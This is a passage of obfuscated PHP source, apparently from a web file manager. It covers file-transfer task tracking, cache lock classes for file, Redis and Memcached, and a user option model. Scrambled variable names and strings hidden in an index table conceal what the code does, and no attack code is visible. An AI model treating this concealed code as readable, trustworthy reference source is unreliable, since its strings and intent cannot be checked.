LNG($ìŞîŒĞ[1720]), $ìŞîŒĞ[1259] => !1); Cache::set($ìŞîŒĞ[1721] . $this->task[$ìŞîŒĞ[445]], $¤Óìö¨ô, 30); $this->onKill(); $this->end(); die; } else { if ($÷ø«äÁ == self::STATYS_STOP) { $ÂÎªÁ§ = 2; $ëØñ¨Àİ[$ìŞîŒĞ[1708]] += $ÂÎªÁ§; self::valueSet($íÄæã[$ìŞîŒĞ[445]], $ëØñ¨Àİ); sleep($ÂÎªÁ§); $this->update(); return; } } $íÄæã[$ìŞîŒĞ[789]] = $÷ø«äÁ ? $÷ø«äÁ : $íÄæã[$ìŞîŒĞ[789]]; $íÄæã[$ìŞîŒĞ[1708]] = $ëØñ¨Àİ[$ìŞîŒĞ[1708]] ? $ëØñ¨Àİ[$ìŞîŒĞ[1708]] : 0; $íÄæã[$ìŞîŒĞ[1707]] = timeFloat(); Hook::trigger($ìŞîŒĞ[1722], $íÄæã); self::valueSet($íÄæã[$ìŞîŒĞ[445]], $íÄæã); } public function onKillSet($÷²ë›’, $™È£›Ëá = array()) { $this->onKillCall = array($÷²ë›’, $™È£›Ëá); } public function onKill() { $üŸ¶å„Ç =& $_SERVER[ò«¥Ê‡å]; self::log($üŸ¶å„Ç[1715] . $this->task[$üŸ¶å„Ç[445]] . $üŸ¶å„Ç[1723]); Hook::trigger($üŸ¶å„Ç[1724], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($–æÊ´) { $¸­¬ˆôò =& $_SERVER[ò«¥Ê‡å]; Cache::set($¸­¬ˆôò[1721] . $this->task[$¸­¬ˆôò[445]], $–æÊ´, 60); return $–æÊ´; } public static function get($÷÷à£ë×) { $ˆÀÑÚ¥ =& $_SERVER[ò«¥Ê‡å]; $ÊÕö·ÉÀ = self::valueGet($÷÷à£ë×); if (is_array($ÊÕö·ÉÀ) && $ÊÕö·ÉÀ[$ˆÀÑÚ¥[1725]]) { $ò¼ÌÎ¸¡ = ActionApply($ÊÕö·ÉÀ[$ˆÀÑÚ¥[1725]], array($ÊÕö·ÉÀ)); $ÊÕö·ÉÀ = is_array($ò¼ÌÎ¸¡) ? $ò¼ÌÎ¸¡ : $ÊÕö·ÉÀ; } return $ÊÕö·ÉÀ; } public static function listData() { $˜À–…Ùè = self::valueGet(); return array_sort_by($˜À–…Ùè, $_SERVER[ò«¥Ê‡å][1705], !0); } public static function kill($”éöí·å) { return self::changeStatus($”éöí·å, self::STATYS_KILL); } public static function stop($€´¥Şç­) { return self::changeStatus($€´¥Şç­, self::STATYS_STOP); } public static function restart($®÷Çƒˆ€) { return self::changeStatus($®÷Çƒˆ€, self::STATYS_RUNNING); } public static function killAll() { $­£è‘€Ê =& $_SERVER[ò«¥Ê‡å]; $ª€•Ì = self::listData(); foreach ($ª€•Ì as $¤Äêªñ) { self::kill($¤Äêªñ[$­£è‘€Ê[445]]); } sleep(2); foreach ($ª€•Ì as $¤Äêªñ) { self::valueSet($¤Äêªñ[$­£è‘€Ê[445]], !1); } } private static function changeStatus($Á¾ùÏ¥ù, $šçæåâ…) { $˜Šè„ùæ =& $_SERVER[ò«¥Ê‡å]; $¢şûşÙú = self::valueGet($Á¾ùÏ¥ù); if (!$¢şûşÙú) { return !1; } $¢şûşÙú[$˜Šè„ùæ[789]] = $šçæåâ…; self::valueSet($Á¾ùÏ¥ù, $¢şûşÙú); self::log($˜Šè„ùæ[1726] . $¢şûşÙú[$˜Šè„ùæ[445]] . $˜Šè„ùæ[1727] . $šçæåâ…); return !0; } public static function valueGet($‹Û¿Ì‰Û = false) { $Å„Ú­¥‹ =& $_SERVER[ò«¥Ê‡å]; if ($‹Û¿Ì‰Û) { $¾—ñÊé´ = Model($Å„Ú­¥‹[490])->where(array($Å„Ú­¥‹[96] => $‹Û¿Ì‰Û, $Å„Ú­¥‹[33] => $Å„Ú­¥‹[1118]))->find(); return $¾—ñÊé´ ? json_decode($¾—ñÊé´[$Å„Ú­¥‹[420]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ËĞ…ËŒ = false) { $¿öæ±›® =& $_SERVER[ò«¥Ê‡å]; $Ö·€€’Ü = array($¿öæ±›®[33] => $¿öæ±›®[1118]); if ($ËĞ…ËŒ) { $Ö·€€’Ü[$¿öæ±›®[1701]] = $ËĞ…ËŒ; } $Œ¶»ª…© = Model($¿öæ±›®[490])->where($Ö·€€’Ü)->select(); $Œ¶»ª…© = $Œ¶»ª…© ? $Œ¶»ª…© : array(); foreach ($Œ¶»ª…© as $ÙÕ€ÆÁ => $œõ¿‘¹¢) { $Œ¶»ª…©[$ÙÕ€ÆÁ] = json_decode($œõ¿‘¹¢[$¿öæ±›®[420]], !0); } return $Œ¶»ª…©; } public static function valueSet($ãˆğĞ¸, $‚¯ë«•Ô) { $´²€Ùš² =& $_SERVER[ò«¥Ê‡å]; if (!$‚¯ë«•Ô) { return Model($´²€Ùš²[490])->where(array($´²€Ùš²[96] => $ãˆğĞ¸, $´²€Ùš²[33] => $´²€Ùš²[1118]))->delete(); } $“ôØÈÆ¡ = json_encode($‚¯ë«•Ô); if (!$“ôØÈÆ¡) { ob_start(); var_dump($‚¯ë«•Ô); $×ƒÖ®¸İ = ob_get_clean(); self::log($´²€Ùš²[1728] . json_encode_force($×ƒÖ®¸İ)); } if (!$ãˆğĞ¸ || !$‚¯ë«•Ô[$´²€Ùš²[445]]) { return !1; } $ş¯Õ¾Ñ· = array($´²€Ùš²[33] => $´²€Ùš²[1118], $´²€Ùš²[1701] => USER_ID, $´²€Ùš²[96] => $ãˆğĞ¸, $´²€Ùš²[420] => $“ôØÈÆ¡); $šâı«˜– = $´²€Ùš²[1729]; CacheLock::lock($šâı«˜–); Model($´²€Ùš²[490])->add($ş¯Õ¾Ñ·, array(), !0); CacheLock::unlock($šâı«˜–); } public static function log($ûãÆÄ´) { if (!GLOBAL_DEBUG) { return; } write_log($ûãÆÄ´, $_SERVER[ò«¥Ê‡å][1730]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ºè†Ú„ı =& $_SERVER[ò«¥Ê‡å]; $½œÈ…ÈÔ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ºè†Ú„ı[1731], array($this, $ºè†Ú„ı[1732])); Hook::bind($ºè†Ú„ı[1270], array($this, $ºè†Ú„ı[1733])); Hook::bind($ºè†Ú„ı[1734], array($this, $ºè†Ú„ı[1735])); Hook::bind($ºè†Ú„ı[638], array($this, $ºè†Ú„ı[1736])); Hook::bind($ºè†Ú„ı[639], array($this, $ºè†Ú„ı[1737])); Hook::bind($ºè†Ú„ı[645], array($this, $ºè†Ú„ı[1738])); Hook::bind($ºè†Ú„ı[646], array($this, $ºè†Ú„ı[1739])); Hook::bind($ºè†Ú„ı[641], array($this, $ºè†Ú„ı[1740])); Hook::bind($ºè†Ú„ı[643], array($this, $ºè†Ú„ı[1741])); Hook::bind($ºè†Ú„ı[607], array($this, $ºè†Ú„ı[1742])); Hook::bind($ºè†Ú„ı[604], array($this, $ºè†Ú„ı[1742])); Hook::bind($ºè†Ú„ı[609], array($this, $ºè†Ú„ı[1742])); Hook::bind($ºè†Ú„ı[611], array($this, $ºè†Ú„ı[1742])); Hook::bind($ºè†Ú„ı[613], array($this, $ºè†Ú„ı[1742])); Hook::bind($ºè†Ú„ı[1743], array($this, $ºè†Ú„ı[1744])); Hook::bind($ºè†Ú„ı[629], array($this, $ºè†Ú„ı[1745])); $this->sourceModelCopyFlag = !1; Hook::bind($ºè†Ú„ı[1746], array($this, $ºè†Ú„ı[1747])); Hook::bind($ºè†Ú„ı[1748], array($this, $ºè†Ú„ı[1749])); Hook::bind($ºè†Ú„ı[1750], array($this, $ºè†Ú„ı[1751])); $½œÈ…ÈÔ[$ºè†Ú„ı[1752]] = LNG($ºè†Ú„ı[1753]); $½œÈ…ÈÔ[$ºè†Ú„ı[1754]] = 0; $½œÈ…ÈÔ[$ºè†Ú„ı[1755]] = 0; $½œÈ…ÈÔ[$ºè†Ú„ı[1111]] = $ºè†Ú„ı[12]; $½œÈ…ÈÔ[$ºè†Ú„ı[1756]] = $ºè†Ú„ı[12]; $½œÈ…ÈÔ[$ºè†Ú„ı[1757]] = 0; $½œÈ…ÈÔ[$ºè†Ú„ı[1758]] = 0; $½œÈ…ÈÔ[$ºè†Ú„ı[1759]] = 0; if (!$½œÈ…ÈÔ[$ºè†Ú„ı[1591]]) { $½œÈ…ÈÔ[$ºè†Ú„ı[1591]] = LNG($ºè†Ú„ı[1760]); } } protected function endAfter() { $çÛƒÒŠñ =& $_SERVER[ò«¥Ê‡å]; Hook::unbind($çÛƒÒŠñ[1731], array($this, $çÛƒÒŠñ[1732])); Hook::unbind($çÛƒÒŠñ[1270], array($this, $çÛƒÒŠñ[1733])); Hook::unbind($çÛƒÒŠñ[1734], array($this, $çÛƒÒŠñ[1735])); Hook::unbind($çÛƒÒŠñ[638], array($this, $çÛƒÒŠñ[1736])); Hook::unbind($çÛƒÒŠñ[639], array($this, $çÛƒÒŠñ[1737])); Hook::unbind($çÛƒÒŠñ[645], array($this, $çÛƒÒŠñ[1738])); Hook::unbind($çÛƒÒŠñ[646], array($this, $çÛƒÒŠñ[1739])); Hook::unbind($çÛƒÒŠñ[641], array($this, $çÛƒÒŠñ[1740])); Hook::unbind($çÛƒÒŠñ[643], array($this, $çÛƒÒŠñ[1741])); Hook::unbind($çÛƒÒŠñ[607], array($this, $çÛƒÒŠñ[1742])); Hook::unbind($çÛƒÒŠñ[604], array($this, $çÛƒÒŠñ[1742])); Hook::unbind($çÛƒÒŠñ[609], array($this, $çÛƒÒŠñ[1742])); Hook::unbind($çÛƒÒŠñ[611], array($this, $çÛƒÒŠñ[1742])); Hook::unbind($çÛƒÒŠñ[613], array($this, $çÛƒÒŠñ[1742])); Hook::unbind($çÛƒÒŠñ[1743], array($this, $çÛƒÒŠñ[1744])); Hook::unbind($çÛƒÒŠñ[629], array($this, $çÛƒÒŠñ[1745])); Hook::unbind($çÛƒÒŠñ[1746], array($this, $çÛƒÒŠñ[1747])); Hook::unbind($çÛƒÒŠñ[1748], array($this, $çÛƒÒŠñ[1749])); Hook::unbind($çÛƒÒŠñ[1750], array($this, $çÛƒÒŠñ[1751])); } public function copyMoveStart($»ÄÎƒÆ´, $ü£ïàÍ², $åíÈŸÃó, $‰±âÓÖ) { $–÷Â©úö =& $_SERVER[ò«¥Ê‡å]; self::log($–÷Â©úö[1761] . $ü£ïàÍ² . $–÷Â©úö[72] . $‰±âÓÖ); $»ê„ÖÍê = rtrim(TEMP_FILES, $–÷Â©úö[8]); if (substr($ü£ïàÍ², 0, strlen($»ê„ÖÍê)) == $»ê„ÖÍê) { return; } if (substr($‰±âÓÖ, 0, strlen($»ê„ÖÍê)) == $»ê„ÖÍê) { return; } $âúÁò¶õ =& $this->task; $âúÁò¶õ[$–÷Â©úö[1762]] = KodIO::transferType($»ÄÎƒÆ´, $åíÈŸÃó); $this->update(); } public function updateAfter() { $ÆË¦Á‡é =& $_SERVER[ò«¥Ê‡å]; $Üë¿ŞÙ´ =& $this->task; if (!$Üë¿ŞÙ´[$ÆË¦Á‡é[802]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Üë¿ŞÙ´[$ÆË¦Á‡é[1762]] == $ÆË¦Á‡é[1362]) { return; } self::updateTask($Üë¿ŞÙ´); } private static function updateTask(&$³ûÃÎÏ) { $½ğ¦³öğ =& $_SERVER[ò«¥Ê‡å]; if ($³ûÃÎÏ[$½ğ¦³öğ[1762]] == $½ğ¦³öğ[1241] || $³ûÃÎÏ[$½ğ¦³öğ[1762]] == $½ğ¦³öğ[109]) { if ($³ûÃÎÏ[$½ğ¦³öğ[1756]]) { $³ûÃÎÏ[$½ğ¦³öğ[1759]] = $³ûÃÎÏ[$½ğ¦³öğ[1758]] + $³ûÃÎÏ[$½ğ¦³öğ[1755]]; } } else { if ($³ûÃÎÏ[$½ğ¦³öğ[1762]] == $½ğ¦³öğ[1363]) { if ($³ûÃÎÏ[$½ğ¦³öğ[1756]] == $½ğ¦³öğ[1241]) { $³ûÃÎÏ[$½ğ¦³öğ[1759]] = $³ûÃÎÏ[$½ğ¦³öğ[1758]] + $³ûÃÎÏ[$½ğ¦³öğ[1755]] * 0.5; } else { if ($³ûÃÎÏ[$½ğ¦³öğ[1756]] == $½ğ¦³öğ[109]) { $³ûÃÎÏ[$½ğ¦³öğ[1759]] = $³ûÃÎÏ[$½ğ¦³öğ[1758]] + $³ûÃÎÏ[$½ğ¦³öğ[1754]] * 0.5 + $³ûÃÎÏ[$½ğ¦³öğ[1755]] * 0.5; } } } } $³ûÃÎÏ[$½ğ¦³öğ[1703]] = $³ûÃÎÏ[$½ğ¦³öğ[1759]] / $³ûÃÎÏ[$½ğ¦³öğ[802]]; if ($³ûÃÎÏ[$½ğ¦³öğ[1703]] > 0) { $á…İ§÷ƒ = timeFloat() - $³ûÃÎÏ[$½ğ¦³öğ[1705]] - $³ûÃÎÏ[$½ğ¦³öğ[1708]]; $³ûÃÎÏ[$½ğ¦³öğ[1709]] = $á…İ§÷ƒ * (1 - $³ûÃÎÏ[$½ğ¦³öğ[1703]]) / $³ûÃÎÏ[$½ğ¦³öğ[1703]]; } } public function addPath($¼•€ªµ¶) { $îÏğÆÖ™ =& $_SERVER[ò«¥Ê‡å]; if (!$¼•€ªµ¶) { return; } $ä™‡¥€ˆ =& $this->task; $Ü·ÙúÆ = IO::infoWithChildren($¼•€ªµ¶); $Ñà–à = $ä™‡¥€ˆ[$îÏğÆÖ™[1763]] ? $ä™‡¥€ˆ[$îÏğÆÖ™[1763]][$îÏğÆÖ™[1764]] : 0; $ä™‡¥€ˆ[$îÏğÆÖ™[1763]] = array($îÏğÆÖ™[1764] => $Ñà–à + 1, $îÏğÆÖ™[464] => $Ü·ÙúÆ[$îÏğÆÖ™[32]], $îÏğÆÖ™[86] => $Ü·ÙúÆ[$îÏğÆÖ™[86]], $îÏğÆÖ™[553] => $Ü·ÙúÆ[$îÏğÆÖ™[553]] ? $Ü·ÙúÆ[$îÏğÆÖ™[553]] : $Ü·ÙúÆ[$îÏğÆÖ™[86]]); if ($Ü·ÙúÆ[$îÏğÆÖ™[33]] == $îÏğÆÖ™[216]) { $ä™‡¥€ˆ[$îÏğÆÖ™[825]] += 1; } else { $ä™‡¥€ˆ[$îÏğÆÖ™[825]] += $Ü·ÙúÆ[$îÏğÆÖ™[81]][$îÏğÆÖ™[79]]; if ($Ü·ÙúÆ[$îÏğÆÖ™[183]]) { $ä™‡¥€ˆ[$îÏğÆÖ™[825]] += $Ü·ÙúÆ[$îÏğÆÖ™[81]][$îÏğÆÖ™[80]] + 1; } } $ä™‡¥€ˆ[$îÏğÆÖ™[802]] += $Ü·ÙúÆ[$îÏğÆÖ™[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($×À‹‰“À) { } public function sourceAddHashEnd($¸Ë§¿í‰) { } public function sourceAddFileStart($©ŸşŞ–) { $ÓÄµ‚Ì» =& $_SERVER[ò«¥Ê‡å]; $Åƒëãîä =& $this->task; $Åƒëãîä[$ÓÄµ‚Ì»[1754]] = $©ŸşŞ–[$ÓÄµ‚Ì»[78]]; $Åƒëãîä[$ÓÄµ‚Ì»[1752]] = $©ŸşŞ–[$ÓÄµ‚Ì»[32]]; $Åƒëãîä[$ÓÄµ‚Ì»[1111]] = $©ŸşŞ–[$ÓÄµ‚Ì»[32]]; $Åƒëãîä[$ÓÄµ‚Ì»[1765]] = $©ŸşŞ–[$ÓÄµ‚Ì»[86]]; $this->update(); } public function sourceAddFileEnd($±²‡Ï½) { $·Ç÷„ü¿ =& $_SERVER[ò«¥Ê‡å]; $ë„Û±¶‡ =& $this->task; $ë„Û±¶‡[$·Ç÷„ü¿[1759]] += $±²‡Ï½[$·Ç÷„ü¿[78]]; $ë„Û±¶‡[$·Ç÷„ü¿[1765]] = $±²‡Ï½[$·Ç÷„ü¿[86]]; $this->update(1); } public function copyFileStart($Ç†®²Ç, $Ëï¶ˆºï, $”¬³Æ©, $î²— Ä¾, $ĞìœĞ†¯, $â¡Í²…Å) { $ßÀ€æèè =& $_SERVER[ò«¥Ê‡å]; $—±©†Š° = $ĞìœĞ†¯; if ($—±©†Š° == $GLOBALS[$ßÀ€æèè[1766]]) { $—±©†Š° = $GLOBALS[$ßÀ€æèè[1767]]; } $GLOBALS[$ßÀ€æèè[1767]] = $ĞìœĞ†¯; $GLOBALS[$ßÀ€æèè[1766]] = $â¡Í²…Å; $ ¸²¨Û =& $this->task; $ ¸²¨Û[$ßÀ€æèè[1752]] = $—±©†Š°; $ ¸²¨Û[$ßÀ€æèè[1754]] = (int) $Ç†®²Ç->size($Ëï¶ˆºï); $ ¸²¨Û[$ßÀ€æèè[1755]] = 0; $ ¸²¨Û[$ßÀ€æèè[1111]] = $ßÀ€æèè[12]; $ ¸²¨Û[$ßÀ€æèè[1756]] = $ßÀ€æèè[12]; $ ¸²¨Û[$ßÀ€æèè[1757]] = 0; $şØË¶Îà = $ ¸²¨Û[$ßÀ€æèè[1754]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ ¸²¨Û[$ßÀ€æèè[445]] . $ßÀ€æèè[1768]); if ($şØË¶Îà && file_exists(get_path_father($î²— Ä¾))) { Cache::set($ ¸²¨Û[$ßÀ€æèè[445]] . $ßÀ€æèè[1768], $î²— Ä¾); $ ¸²¨Û[$ßÀ€æèè[1725]] = array($ßÀ€æèè[1769], $ßÀ€æèè[1770]); } $this->update(0, $şØË¶Îà); } public static function updateCopyLocalFileSize($£÷¥Ø…½) { $Ÿí¬°è“ =& $_SERVER[ò«¥Ê‡å]; $œà„œÓ¼ = Cache::get($£÷¥Ø…½[$Ÿí¬°è“[445]] . $Ÿí¬°è“[1768]); if (!$œà„œÓ¼ || !file_exists($œà„œÓ¼)) { return $£÷¥Ø…½; } $£÷¥Ø…½[$Ÿí¬°è“[1755]] = @filesize($œà„œÓ¼); $£÷¥Ø…½[$Ÿí¬°è“[1759]] += $£÷¥Ø…½[$Ÿí¬°è“[1755]]; self::updateTask($£÷¥Ø…½); return $£÷¥Ø…½; } public function copyFileEnd($ì’ùéˆ, $•Á·ÑŸ, $Ö˜¢÷ú, $úñ¢–¯á, $ ©•š…, $Ô¢±Ãğ¦) { $¥ÂŠ§¬ö =& $_SERVER[ò«¥Ê‡å]; $¿º¶ÏÂ =& $this->task; $¿º¶ÏÂ[$¥ÂŠ§¬ö[1755]] = $¿º¶ÏÂ[$¥ÂŠ§¬ö[1754]]; $¿º¶ÏÂ[$¥ÂŠ§¬ö[1756]] = $¥ÂŠ§¬ö[12]; unset($¿º¶ÏÂ[$¥ÂŠ§¬ö[1725]]); if ($ ©•š… == $¿º¶ÏÂ[$¥ÂŠ§¬ö[1752]]) { $¿º¶ÏÂ[$¥ÂŠ§¬ö[1758]] += $¿º¶ÏÂ[$¥ÂŠ§¬ö[1754]]; $¿º¶ÏÂ[$¥ÂŠ§¬ö[1759]] = $¿º¶ÏÂ[$¥ÂŠ§¬ö[1758]]; $Ş—›Õ¤ø = 1; if (isset($¿º¶ÏÂ[$¥ÂŠ§¬ö[1765]]) && $¿º¶ÏÂ[$¥ÂŠ§¬ö[1765]] == $•Á·ÑŸ) { $Ş—›Õ¤ø = 0; } $this->update($Ş—›Õ¤ø); } else { $this->update(); $¿º¶ÏÂ[$¥ÂŠ§¬ö[1755]] = 0; } Cache::remove($¿º¶ÏÂ[$¥ÂŠ§¬ö[445]] . $¥ÂŠ§¬ö[1768]); self::log($¥ÂŠ§¬ö[1771] . $•Á·ÑŸ . $¥ÂŠ§¬ö[72] . $úñ¢–¯á . $¥ÂŠ§¬ö[248] . $ ©•š… . $¥ÂŠ§¬ö[1772] . $¿º¶ÏÂ[$¥ÂŠ§¬ö[1752]]); } public function updateFileEnd($ËÆòÎúé, $¢«‘¢Ë) { $íæ¸‘ºí =& $_SERVER[ò«¥Ê‡å]; $Øş‘ûê =& $this->task; $Øş‘ûê[$íæ¸‘ºí[1752]] = $ËÆòÎúé; $Øş‘ûê[$íæ¸‘ºí[1754]] = $¢«‘¢Ë; $Øş‘ûê[$íæ¸‘ºí[1758]] += $¢«‘¢Ë; $Øş‘ûê[$íæ¸‘ºí[1759]] = $Øş‘ûê[$íæ¸‘ºí[1758]]; $this->update(1); self::log($íæ¸‘ºí[1773] . $ËÆòÎúé); } public function sourceModelCopy($¨ãÁºˆº) { $…÷¹ì¼ =& $_SERVER[ò«¥Ê‡å]; $£Õò¾€ = $¨ãÁºˆº[0]; $¾û¨ˆÍ´ = $¨ãÁºˆº[1]; $ÅÖËÍ‚Û =& $this->task; $this->sourceModelCopyFlag = !0; $ë”„©ğ¹ = 0; switch ($£Õò¾€) { case $…÷¹ì¼[605]: $ë”„©ğ¹ = 1; break; case $…÷¹ì¼[608]: $ÅÖËÍ‚Û[$…÷¹ì¼[1752]] = $¾û¨ˆÍ´[$…÷¹ì¼[32]]; break; case $…÷¹ì¼[610]: $ë”„©ğ¹ = intval($¨ãÁºˆº[$…÷¹ì¼[426]] * 0.4); break; case $…÷¹ì¼[612]: $ë”„©ğ¹ = intval($¨ãÁºˆº[$…÷¹ì¼[426]] * 0.2); break; case $…÷¹ì¼[614]: $ë”„©ğ¹ = intval($¨ãÁºˆº[$…÷¹ì¼[426]] * 0.4); break; } $this->update($ë”„©ğ¹); $this->sourceModelCopyFlag = !1; } public function sourceRemove($´âÎÃˆÌ, $ï´ÁˆÔ) { $àòı¸¤ä =& $_SERVER[ò«¥Ê‡å]; $this->sourceModelCopyFlag = !0; $‡Îº¾Ä = 1; if (isset($´âÎÃˆÌ[$àòı¸¤ä[81]])) { $‡Îº¾Ä = $´âÎÃˆÌ[$àòı¸¤ä[81]][$àòı¸¤ä[79]]; $‡Îº¾Ä = $‡Îº¾Ä + $´âÎÃˆÌ[$àòı¸¤ä[81]][$àòı¸¤ä[80]] + 1; } $this->update($‡Îº¾Ä); $this->sourceModelCopyFlag = !1; } public function sourceMove($¶Ïšˆ•§) { $this->sourceRemove($¶Ïšˆ•§, !1); } public function curlProgress($ŸÑšøš, $‘Å™‘š™, $£“º‡Õ‘, $ÆĞá¨÷µ, $…Ä˜‰ª”) { $¤ëÄºàĞ =& $_SERVER[ò«¥Ê‡å]; $ˆôªŞÇÂ =& $this->task; if ($…Ä˜‰ª” > 0) { $ˆôªŞÇÂ[$¤ëÄºàĞ[1111]] = $¤ëÄºàĞ[1774]; $ˆôªŞÇÂ[$¤ëÄºàĞ[1756]] = $¤ëÄºàĞ[109]; if ($ˆôªŞÇÂ[$¤ëÄºàĞ[1754]]) { $ˆôªŞÇÂ[$¤ëÄºàĞ[1755]] = $…Ä˜‰ª”; } if ($ˆôªŞÇÂ[$¤ëÄºàĞ[1757]]) { $ˆôªŞÇÂ[$¤ëÄºàĞ[1755]] = $…Ä˜‰ª” + $ˆôªŞÇÂ[$¤ëÄºàĞ[1757]]; } } else { if ($£“º‡Õ‘ > 0) { if ($ˆôªŞÇÂ[$¤ëÄºàĞ[1754]] == $‘Å™‘š™) { $ˆôªŞÇÂ[$¤ëÄºàĞ[1755]] = $£“º‡Õ‘; $ˆôªŞÇÂ[$¤ëÄºàĞ[1111]] = $¤ëÄºàĞ[1775]; $ˆôªŞÇÂ[$¤ëÄºàĞ[1756]] = $¤ëÄºàĞ[1241]; } } } $this->update(); } public function curlProgressStart($“„¶‚™³) { } public function curlProgressEnd($Œìú§) { $Ê’àØ› =& $_SERVER[ò«¥Ê‡å]; $÷à©Ÿ¬ı =& $this->task; $²ÆØ€áá = curl_getinfo($Œìú§); $Îªç«ãÂ = $²ÆØ€áá[$Ê’àØ›[1776]]; if ($Îªç«ãÂ == -1) { $Îªç«ãÂ = $²ÆØ€áá[$Ê’àØ›[1777]]; } if ($÷à©Ÿ¬ı[$Ê’àØ›[1756]] == $Ê’àØ›[109] && $Îªç«ãÂ) { $÷à©Ÿ¬ı[$Ê’àØ›[1757]] += $Îªç«ãÂ; } $this->update(); } } goto fˆ¹…¯æ; cÌ¯¹…: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ØŒ¦ìª¸ =& $_SERVER[ò«¥Ê‡å]; $ÎÇŸ†Øä = $GLOBALS[$ØŒ¦ìª¸[6]][$ØŒ¦ìª¸[395]]; self::$cachePath = $ÎÇŸ†Øä[$ØŒ¦ìª¸[216]][$ØŒ¦ìª¸[86]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($À›€èÔß, $¸ƒ³ÃĞİ = 0) { $Çï·Ë„‘ =& $_SERVER[ò«¥Ê‡å]; $ş”¼Â„ˆ = microtime(!0); $ş¡×Ï“¢ = $ş”¼Â„ˆ + $¸ƒ³ÃĞİ + 0.0001; $„³æŒ„É = rtrim(self::$cachePath, $Çï·Ë„‘[8]) . $Çï·Ë„‘[910] . md5($À›€èÔß) . $Çï·Ë„‘[907]; if (file_exists($„³æŒ„É) && filemtime($„³æŒ„É) && filemtime($„³æŒ„É) < time() - 10) { @unlink($„³æŒ„É); } do { if (file_exists($„³æŒ„É)) { cacheLockWait(); continue; } $ü‰¯ıÆ£ = fopen($„³æŒ„É, $Çï·Ë„‘[911]); if (!$ü‰¯ıÆ£) { return !1; } $“ğ­€Ñ‰ = flock($ü‰¯ıÆ£, LOCK_EX | LOCK_NB); self::$caches[$À›€èÔß] = array($Çï·Ë„‘[912] => $ü‰¯ıÆ£, $Çï·Ë„‘[216] => $„³æŒ„É); fwrite($ü‰¯ıÆ£, $ş¡×Ï“¢); clearstatcache(); if ($ü‰¯ıÆ£ && $“ğ­€Ñ‰) { return !0; } cacheLockWait(); } while (microtime(!0) < $ş¡×Ï“¢); $this->unlock($À›€èÔß); return !1; } public function lockGet($·¨ççÙ) { $”ªÜâ¤÷ =& $_SERVER[ò«¥Ê‡å]; $¤¯Ÿ¨² = rtrim(self::$cachePath, $”ªÜâ¤÷[8]) . $”ªÜâ¤÷[910] . md5($·¨ççÙ) . $”ªÜâ¤÷[907]; return file_exists($¤¯Ÿ¨²); } public function unlock($ÎŞ–Üõ) { $¹çõåË =& $_SERVER[ò«¥Ê‡å]; $Şãù¯æ = self::$caches[$ÎŞ–Üõ]; if (!$Şãù¯æ) { return; } @flock($Şãù¯æ[$¹çõåË[912]], LOCK_UN); @fclose($Şãù¯æ[$¹çõåË[912]]); @unlink($Şãù¯æ[$¹çõåË[216]]); unset(self::$caches[$ÎŞ–Üõ]); } } class CacheLockRedis { public function lock($ÆíŒ¦Ğ, $ÌË³©å¢ = 10) { $÷€çòÛÌ = Cache::init(); $»Ñ Á‰å = microtime(!0) + $ÌË³©å¢; while (microtime(!0) < $»Ñ Á‰å) { $”ú¬©¬Ï = $÷€çòÛÌ->get($ÆíŒ¦Ğ); if (!$”ú¬©¬Ï) { $ã€¨Áä = $÷€çòÛÌ->setLock($ÆíŒ¦Ğ, $»Ñ Á‰å, $ÌË³©å¢); if ($ã€¨Áä) { return !0; } } else { if ($”ú¬©¬Ï < microtime(!0)) { $÷€çòÛÌ->set($ÆíŒ¦Ğ, $»Ñ Á‰å, $ÌË³©å¢ * 2); if ($÷€çòÛÌ->get($ÆíŒ¦Ğ) === $”ú¬©¬Ï) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ûÈ¶¹ÒÖ) { return Cache::init()->get($ûÈ¶¹ÒÖ); } public function unlock($…û‚«Ø¦) { return Cache::init()->remove($…û‚«Ø¦); } } class CacheLockMemcached { public function lock($™‹µÉÒ§, $Ñœïê›“ = 0) { $¤®Šƒ¸× = Cache::init(); $ãÅ†¨À£ = microtime(!0) + $Ñœïê›“; while (microtime(!0) < $ãÅ†¨À£) { $îˆÁÔ‰ş = $¤®Šƒ¸×->get($™‹µÉÒ§); if (!$îˆÁÔ‰ş || $îˆÁÔ‰ş < microtime(!0)) { $Øµè¯Ÿà = $¤®Šƒ¸×->handle->add($™‹µÉÒ§, $ãÅ†¨À£, $Ñœïê›“); if ($Øµè¯Ÿà) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ñÜû‹ıä) { return Cache::init()->get($ñÜû‹ıä); } public function unlock($±‹ŒªÜƒ) { return Cache::init()->remove($±‹ŒªÜƒ); } } goto e³‹íº†´„; fƒ¡ê‹îÑ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\137\157\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ü×äÙ­ü) { $áĞòŠ£Î =& $_SERVER[ò«¥Ê‡å]; $æ¶ãçê = defined($áĞòŠ£Î[2121]) && USER_ID ? USER_ID : $áĞòŠ£Î[12]; return "\125\x73\x65\162\x4f\160\x74\151\157\x6e\x5f{$ü×äÙ­ü}\137" . $æ¶ãçê; } protected function filterWhere($±¹àè¡) { $¼ìÓôÙ¢ =& $_SERVER[ò«¥Ê‡å]; $±¹àè¡[$¼ìÓôÙ¢[1701]] = defined($¼ìÓôÙ¢[2121]) && USER_ID ? USER_ID : $¼ìÓôÙ¢[12]; return $±¹àè¡; } public function cacheRemoveUser($í‡±ö­¾, $›¬Ö‡à) { return Cache::remove("\125\x73\145\x72\117\x70\x74\151\157\x6e\137{$í‡±ö­¾}\x5f" . $›¬Ö‡à); } protected function optionDefault($ùö·¿Âä = '') { $¹×¦œ’¡ =& $_SERVER[ò«¥Ê‡å]; if ($ùö·¿Âä == $¹×¦œ’¡[12]) { return 